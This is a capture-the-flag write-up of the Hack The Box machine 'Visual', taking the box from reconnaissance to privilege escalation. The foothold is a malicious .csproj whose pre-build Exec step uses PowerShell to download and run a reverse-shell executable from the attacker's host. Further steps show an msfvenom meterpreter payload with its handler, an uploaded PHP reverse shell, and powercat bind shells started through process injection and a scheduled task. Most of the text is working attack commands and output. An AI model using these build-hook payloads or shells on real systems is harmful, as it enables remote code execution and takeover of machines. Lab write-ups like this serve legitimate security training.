# Visual

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV 10.129.91.95
[sudo] password for user: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 19:06 UTC
Nmap scan report for 10.129.91.95
Host is up (0.095s latency).
Not shown: 866 filtered tcp ports (no-response), 133 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (86%)
Aggressive OS guesses: Microsoft Windows Server 2019 (86%)
No exact OS matches for host (test conditions non-ideal).

TRACEROUTE (using port 6543/tcp)
HOP RTT       ADDRESS
1   122.64 ms 10.10.16.1
2   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 374.00 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.91.95
[sudo] password for user: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 19:27 UTC
Nmap scan report for 10.129.91.95
Host is up (0.16s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   163.55 ms 10.10.16.1
2   206.80 ms 10.129.91.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.70 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.91.95
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 19:40 UTC
Nmap scan report for 10.129.91.95
Host is up (0.041s latency).
All 1000 scanned ports on 10.129.91.95 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5117.14 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.91.95/

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://10.129.91.95/
http://10.129.91.95/ [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17], IP[10.129.91.95], OpenSSL[1.1.1t], PHP[8.1.17], Script, Title[Visual - Revolutionizing Visual Studio Builds], X-Powered-By[PHP/8.1.17]
```

#### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://10.129.91.95/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/user/.dirsearch/reports/10.129.91.95/-_23-09-30_19-08-18.txt

Error Log: /home/user/.dirsearch/logs/errors-23-09-30_19-08-18.log

Target: http://10.129.91.95/

[19:08:19] Starting: 
[19:08:20] 301 -  334B  - /js  ->  http://10.129.91.95/js/                 
[19:08:20] 403 -  302B  - /%C0%AE%C0%AE%C0%AF                              
[19:08:20] 403 -  302B  - /%3f/                                            
[19:08:20] 403 -  302B  - /%ff                                             
[19:08:22] 403 -  302B  - /.ht_wsr.txt                                     
[19:08:22] 403 -  302B  - /.htaccess.sample                                
[19:08:22] 403 -  302B  - /.htaccess.bak1
[19:08:22] 403 -  302B  - /.htaccessOLD2
[19:08:22] 403 -  302B  - /.htaccess_orig
[19:08:22] 403 -  302B  - /.htaccessOLD
[19:08:22] 403 -  302B  - /.htaccess_sc
[19:08:22] 403 -  302B  - /.htaccessBAK
[19:08:22] 403 -  302B  - /.html
[19:08:22] 403 -  302B  - /.htm                                            
[19:08:22] 403 -  302B  - /.htpasswd_test
[19:08:22] 403 -  302B  - /.htpasswds
[19:08:22] 403 -  302B  - /.httr-oauth                                     
[19:08:22] 403 -  302B  - /.htaccess.save                                  
[19:08:22] 403 -  302B  - /.htaccess_extra
[19:08:22] 403 -  302B  - /.htaccess.orig
[19:08:27] 403 -  302B  - /Trace.axd::$DATA                                 
[19:08:36] 200 -  987B  - /assets/                                          
[19:08:36] 301 -  338B  - /assets  ->  http://10.129.91.95/assets/          
[19:08:38] 403 -  302B  - /cgi-bin/                                         
[19:08:38] 200 -    2KB - /cgi-bin/printenv.pl                              
[19:08:40] 301 -  335B  - /css  ->  http://10.129.91.95/css/                
[19:08:44] 503 -  402B  - /examples                                         
[19:08:44] 503 -  402B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[19:08:44] 503 -  402B  - /examples/jsp/snp/snoop.jsp
[19:08:44] 503 -  402B  - /examples/
[19:08:44] 503 -  402B  - /examples/servlets/servlet/CookieExample          
[19:08:44] 503 -  402B  - /examples/servlets/index.html                     
[19:08:44] 503 -  402B  - /examples/servlet/SnoopServlet                    
[19:08:44] 503 -  402B  - /examples/servlets/servlet/RequestHeaderExample
[19:08:47] 200 -    7KB - /index.php                                        
[19:08:47] 200 -    7KB - /index.php/login/                                 
[19:08:47] 403 -  302B  - /index.php::$DATA                                 
[19:08:47] 200 -    7KB - /index.php.                                       
[19:08:47] 200 -    7KB - /index.pHp
[19:08:48] 200 -  979B  - /js/                                              
[19:08:54] 403 -  421B  - /phpmyadmin/docs/html/index.html                  
[19:08:54] 403 -  421B  - /phpmyadmin/ChangeLog                             
[19:08:54] 403 -  421B  - /phpmyadmin/README
[19:08:54] 403 -  421B  - /phpmyadmin/doc/html/index.html                   
[19:08:55] 403 -  421B  - /phpmyadmin                                       
[19:08:56] 403 -  421B  - /phpmyadmin/index.php                             
[19:08:56] 403 -  421B  - /phpmyadmin/scripts/setup.php                     
[19:08:56] 403 -  421B  - /phpmyadmin/                                      
[19:08:56] 403 -  421B  - /phpmyadmin/phpmyadmin/index.php                  
[19:09:00] 403 -  421B  - /server-status                                    
[19:09:00] 403 -  421B  - /server-info                                      
[19:09:00] 403 -  421B  - /server-status/                                   
[19:09:06] 403 -  302B  - /uploads/                                         
[19:09:06] 301 -  339B  - /uploads  ->  http://10.129.91.95/uploads/        
[19:09:07] 403 -  302B  - /web.config::$DATA                                
[19:09:08] 403 -  421B  - /webalizer                                        
                                                                             
Task Completed
```

> http://10.129.91.95/cgi-bin/printenv.pl

```c
COMSPEC="C:\Windows\system32\cmd.exe"
CONTEXT_DOCUMENT_ROOT="/xampp/cgi-bin/"
CONTEXT_PREFIX="/cgi-bin/"
DOCUMENT_ROOT="C:/xampp/htdocs"
GATEWAY_INTERFACE="CGI/1.1"
HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
HTTP_ACCEPT_ENCODING="gzip, deflate"
HTTP_ACCEPT_LANGUAGE="en-US,en;q=0.5"
HTTP_CONNECTION="keep-alive"
HTTP_DNT="1"
HTTP_HOST="10.129.91.95"
HTTP_SEC_GPC="1"
HTTP_UPGRADE_INSECURE_REQUESTS="1"
HTTP_USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
MIBDIRS="/xampp/php/extras/mibs"
MYSQL_HOME="\xampp\mysql\bin"
OPENSSL_CONF="/xampp/apache/bin/openssl.cnf"
PATH="C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\dotnet\;C:\ProgramData\chocolatey\bin;C:\Program Files\Git\cmd;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps"
PATHEXT=".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
PHPRC="\xampp\php"
PHP_PEAR_SYSCONF_DIR="\xampp\php"
QUERY_STRING=""
REMOTE_ADDR="10.10.16.29"
REMOTE_PORT="36174"
REQUEST_METHOD="GET"
REQUEST_SCHEME="http"
REQUEST_URI="/cgi-bin/printenv.pl"
SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
SCRIPT_NAME="/cgi-bin/printenv.pl"
SERVER_ADDR="10.129.91.95"
SERVER_ADMIN="postmaster@localhost"
SERVER_NAME="10.129.91.95"
SERVER_PORT="80"
SERVER_PROTOCOL="HTTP/1.1"
SERVER_SIGNATURE="<address>Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17 Server at 10.129.91.95 Port 80</address>\n"
SERVER_SOFTWARE="Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17"
SYSTEMROOT="C:\Windows"
TMP="\xampp\tmp"
WINDIR="C:\Windows"

```

## Foothold

> http://10.129.91.95/

> https://github.com/go-gitea/gitea/blob/main/Dockerfile

> https://git-scm.com/docs/git-upload-pack

```c
┌──(user㉿kali)-[/media/…/htb/machines/visual/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.91.95 - - [30/Sep/2023 19:27:49] code 404, message File not found
10.129.91.95 - - [30/Sep/2023 19:27:49] "GET /apt.zip/info/refs?service=git-upload-pack HTTP/1.1" 404 -
```

```c
[-] The repository doesn't contain a .sln file or the URL submitted is invalid.
```

#### Installing Gittea

```c
┌──(user㉿kali)-[/media/…/htb/machines/visual/serve]
└─$ sudo docker run -p 3000:3000 6877f5aabc34        
Generating /data/ssh/ssh_host_ed25519_key...
Generating /data/ssh/ssh_host_rsa_key...
Generating /data/ssh/ssh_host_ecdsa_key...
Server listening on :: port 22.
Server listening on 0.0.0.0 port 22.
2023/09/30 20:02:45 cmd/web.go:223:runWeb() [I] Starting Gitea on PID: 18
2023/09/30 20:02:45 cmd/web.go:106:serveInstall() [I] Gitea version: 1.20.4 built with GNU Make 4.4.1, go1.20.8 : bindata, timetzdata, sqlite, sqlite_unlock_notify
2023/09/30 20:02:45 cmd/web.go:107:serveInstall() [I] App path: /usr/local/bin/gitea
2023/09/30 20:02:45 cmd/web.go:108:serveInstall() [I] Work path: /data/gitea
2023/09/30 20:02:45 cmd/web.go:109:serveInstall() [I] Custom path: /data/gitea
2023/09/30 20:02:45 cmd/web.go:110:serveInstall() [I] Config file: /data/gitea/conf/app.ini
2023/09/30 20:02:45 cmd/web.go:111:serveInstall() [I] Prepare to run install page
2023/09/30 20:02:45 cmd/web.go:285:listen() [I] Listen: http://0.0.0.0:3000
2023/09/30 20:02:45 cmd/web.go:289:listen() [I] AppURL(ROOT_URL): http://localhost:3000/
2023/09/30 20:02:45 ...s/graceful/server.go:62:NewServer() [I] Starting new Web server: tcp:0.0.0.0:3000 on PID: 18
```

> http://localhost:3000

| Username | Email | Password |
| --- | --- | --- |
| foobar | foobar@foobar.local | foobar! |

We created a new `C# project` as `Console Application` with the following payload.

Payload:

Program.cs

> http://localhost:3000/foobar/revshell/src/branch/main/revshell/Program.cs

```c
System.Diagnostics.Process.Start("powershell.exe", "-c iwr 10.10.16.29/revshell.exe -o c:\\\\windows\\\\temp\\\\revshell.exe -useb");
System.Diagnostics.Process.Start("c:\\\\windows\\\\temp\\\\revshell.exe");
```

revshell.csproj

> http://localhost:3000/foobar/revshell/src/branch/main/revshell/revshell.csproj

```c
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <RunPostBuildEvent>Always</RunPostBuildEvent>
  </PropertyGroup>

  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell.exe -c iwr 10.10.16.29/revshell.exe -o c:\windows\temp\revshell.exe -useb;c:\windows\temp\revshell.exe" />
  </Target>

  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
    <Exec Command="calc.exe" />
  </Target>

</Project>
```

From `Visual Studio` we pushed the project directly to the `Gittea` instance on `Kali`.

```c
┌──(user㉿kali)-[/media/…/htb/machines/visual/serve]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.29 LPORT=4444 -f exe -o revshell.exe           
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: revshell.exe
```

```c
┌──(user㉿kali)-[~]
└─$ msfconsole
                                                  

Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)


Stack: 90909090990909090990909090
       90909090990909090990909090
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ..........................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffff..................
       ffffffff..................


Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing


       =[ metasploit v6.3.31-dev                          ]
+ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params 
set LHOST eth0
Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.16.29
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.29:4444
```

> http://10.10.16.29:3000/foobar/revshell

```c
┌──(user㉿kali)-[/media/…/htb/machines/visual/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.91.95 - - [30/Sep/2023 22:17:32] "GET /revshell.exe HTTP/1.1" 200 -
```

```c
[*] Sending stage (175686 bytes) to 10.129.91.95
[*] Meterpreter session 1 opened (10.10.16.29:4444 -> 10.129.91.95:49722) at 2023-09-30 22:17:36 +0000

meterpreter >
```

## Enumeration

```c
meterpreter > shell
Process 4748 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.4840]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\Temp\39e529a83bc87460fd5393717479d7\revshell>whoami /all
whoami /all

USER INFORMATION
----------------

User Name   SID                                          
=========== =============================================
visual\enox S-1-5-21-328618757-2344576039-2580610453-1003


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

ERROR: Unable to get user claims information.
```

## user.txt

```c
C:\Users\enox\Desktop>type user.txt
type user.txt
12cd481057dd68faa68b5a8c68220ba8
```

```c
C:\Windows\Temp\39e529a83bc87460fd5393717479d7\revshell>systeminfo
systeminfo

Host Name:                 VISUAL
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA642
Original Install Date:     6/10/2023, 10:08:12 AM
System Boot Time:          9/30/2023, 12:06:04 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,856 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,596 MB
Virtual Memory: In Use:    1,203 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.91.95
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```c
PS C:\temp> netstat -aon
netstat -aon

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2316
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       2316
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       460
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1372
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       620
  TCP    10.129.91.95:139       0.0.0.0:0              LISTENING       4
  TCP    10.129.91.95:49704     10.10.16.29:9001       ESTABLISHED     2380
  TCP    10.129.91.95:49746     10.10.16.29:4444       ESTABLISHED     4488
  TCP    10.129.91.95:49911     10.10.14.136:16443     SYN_SENT        4708
  TCP    10.129.91.95:49912     10.10.14.136:16443     SYN_SENT        2032
  TCP    10.129.91.95:49913     10.10.14.136:16443     SYN_SENT        5088
  TCP    [::]:80                [::]:0                 LISTENING       2316
  TCP    [::]:135               [::]:0                 LISTENING       840
  TCP    [::]:443               [::]:0                 LISTENING       2316
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       460
  TCP    [::]:49665             [::]:0                 LISTENING       1096
  TCP    [::]:49666             [::]:0                 LISTENING       1372
  TCP    [::]:49667             [::]:0                 LISTENING       600
  TCP    [::]:49668             [::]:0                 LISTENING       620
  UDP    0.0.0.0:123            *:*                                    2544
  UDP    0.0.0.0:5353           *:*                                    1468
  UDP    0.0.0.0:5355           *:*                                    1468
  UDP    10.129.91.95:137       *:*                                    4
  UDP    10.129.91.95:138       *:*                                    4
  UDP    127.0.0.1:55783        *:*                                    2520
  UDP    [::]:123               *:*                                    2544
```

## Privilege Escalation to Service User

> https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php

```c
PS C:\xampp\htdocs> iwr 10.10.16.29/php_reverse_shell.php -o php_reverse_shell.php
iwr 10.10.16.29/php_reverse_shell.php -o php_reverse_shell.php
```

> http://10.129.91.95/php_reverse_shell.php

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 6669
listening on [any] 6669 ...
connect to [10.10.16.29] from (UNKNOWN) [10.129.91.95] 54778
SOCKET: Shell has connected! PID: 4448
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
nt authority\local service

C:\xampp\htdocs>
```

## Pivoting

```c
C:\xampp\htdocs>whoami /all

USER INFORMATION
----------------

User Name                  SID     
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                                                              Attributes                                        
====================================== ================ ================================================================================================ ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                                       
Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Privilege Escalation to root

We searched for something like `windows local privilege escalation from service user no impersonate` and found the following article.

> https://itm4n.github.io/localservice-privileges/

> https://github.com/besimorhino/powercat

> https://www.nirsoft.net/utils/run_from_process.html

```c
PS C:\temp> iwr 10.10.16.29/powercat.ps1 -o powercat.ps1
PS C:\temp> iwr 10.10.16.29/RunFromProcess-x64.exe -o RunFromProcess-x64.exe
```

```c
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User         Path
 ---   ----  ----               ----  -------  ----         ----
 0     0     [System Process]
 4     0     System
 88    4     Registry
 264   4     smss.exe
 360   352   csrss.exe
 364   600   svchost.exe
 380   2380  cmd.exe            x86   0        VISUAL\enox  C:\Windows\SysWOW64\cmd.exe
 460   352   wininit.exe
 468   452   csrss.exe
 492   600   svchost.exe
 532   452   winlogon.exe
 596   600   svchost.exe
 600   460   services.exe
 620   460   lsass.exe
 716   600   svchost.exe
 736   460   fontdrvhost.exe
 744   532   fontdrvhost.exe
 752   600   svchost.exe
 836   600   svchost.exe
 840   600   svchost.exe
 892   600   svchost.exe
 952   532   LogonUI.exe
 960   532   dwm.exe
 976   600   svchost.exe
 1096  600   svchost.exe
 1112  3616  cmd.exe            x86   0        VISUAL\enox  C:\Windows\SysWOW64\cmd.exe
 1136  4496  conhost.exe        x64   0        VISUAL\enox  C:\Windows\System32\conhost.exe
 1192  4496  powershell.exe     x86   0        VISUAL\enox  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 1196  600   svchost.exe
 1208  600   svchost.exe
 1220  600   svchost.exe
 1240  600   svchost.exe
 1264  600   svchost.exe
 1316  600   svchost.exe
 1372  600   svchost.exe
 1392  600   svchost.exe
 1436  600   svchost.exe
 1468  600   svchost.exe
 1500  4600  revssh.exe         x64   0        VISUAL\enox  C:\Windows\Temp\revssh.exe
 1512  600   svchost.exe
 1524  600   svchost.exe
 1572  600   svchost.exe
 1604  4748  conhost.exe        x64   0        VISUAL\enox  C:\Windows\System32\conhost.exe
 1608  600   svchost.exe
 1664  600   svchost.exe
 1696  600   svchost.exe
 1740  4448  conhost.exe
 1760  600   svchost.exe
 1812  600   svchost.exe
 1868  600   svchost.exe
 1900  600   svchost.exe
 1912  600   svchost.exe
 1940  600   svchost.exe
 2000  600   svchost.exe
 2032  284   revssh.exe         x64   0        VISUAL\enox  C:\Windows\Temp\revssh.exe
 2308  600   svchost.exe
 2316  600   httpd.exe
 2324  600   svchost.exe
 2356  600   svchost.exe
 2380  144   nc.exe             x86   0        VISUAL\enox  C:\program\nc.exe
 2392  380   rundll32.exe       x86   0        VISUAL\enox  C:\Windows\SysWOW64\rundll32.exe
 2400  600   svchost.exe
 2424  600   nssm.exe           x64   0        VISUAL\enox  C:\Program Files\nssm-2.24\win64\nssm.exe
 2448  600   svchost.exe
 2468  600   svchost.exe
 2484  600   VGAuthService.exe
 2512  600   vmtoolsd.exe
 2520  600   svchost.exe
 2528  600   vm3dservice.exe
 2540  600   svchost.exe
 2544  600   svchost.exe
 2612  2424  conhost.exe        x64   0        VISUAL\enox  C:\Windows\System32\conhost.exe
 2912  600   svchost.exe
 2952  600   svchost.exe
 3076  2528  vm3dservice.exe
 3124  760   win32calc.exe      x86   0        VISUAL\enox  C:\Windows\SysWOW64\win32calc.exe
 3320  2424  powershell.exe     x64   0        VISUAL\enox  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 3400  4448  cmd.exe
 3408  600   svchost.exe
 3444  2380  conhost.exe        x64   0        VISUAL\enox  C:\Windows\System32\conhost.exe
 3600  2316  httpd.exe
 4244  1112  Seatbelt.exe       x64   0        VISUAL\enox  C:\temp\Seatbelt.exe
 4252  1112  conhost.exe        x64   0        VISUAL\enox  C:\Windows\System32\conhost.exe
 4288  600   dllhost.exe
 4404  752   WmiPrvSE.exe
 4428  600   svchost.exe
 4448  3600  cmd.exe
 4488  2200  revshell.exe       x86   0        VISUAL\enox  C:\Windows\Temp\revshell.exe
 4496  4488  cmd.exe            x86   0        VISUAL\enox  C:\Windows\SysWOW64\cmd.exe
 4640  600   msdtc.exe
 4696  1908  revssh.exe         x64   0        VISUAL\enox  C:\Windows\Temp\revssh.exe
 4708  1232  revssh.exe         x64   0        VISUAL\enox  C:\Windows\Temp\revssh.exe
 4748  3616  cmd.exe            x86   0        VISUAL\enox  C:\Windows\SysWOW64\cmd.exe
 4820  2568  revssh.exe         x64   0        VISUAL\enox  C:\Windows\Temp\revssh.exe
 4852  3400  powershell.exe
 4980  600   svchost.exe
 5012  600   svchost.exe
 5088  4600  revssh.exe         x64   0        VISUAL\enox  C:\Windows\Temp\revssh.exe
```

```c
PS C:\temp> .\RunFromProcess-x64.exe 2316 "C:\xampp\apache\bin\httpd.exe" -ep Bypass -Command ". C:\temp\powercat.ps1;powercat -l -p 7001 -ep"
PS C:\temp> . .\powercat.ps1
PS C:\temp> powercat -c 127.0.0.1 -p 7001
PS C:\temp> whoami
nt authority\local service
```

```c
PS C:\temp> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `". C:\temp\powercat.ps1; powercat -l -p 7002 -ep`""
PS C:\temp> Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask"
TaskName "SomeTask"

TaskPath                                       TaskName                          State     
--------                                       --------                          -----     
\                                              SomeTask                          Ready     


PS C:\temp> Start-ScheduledTask -TaskName "SomeTask"
```

```c
PS C:\temp> . .\powercat.ps1
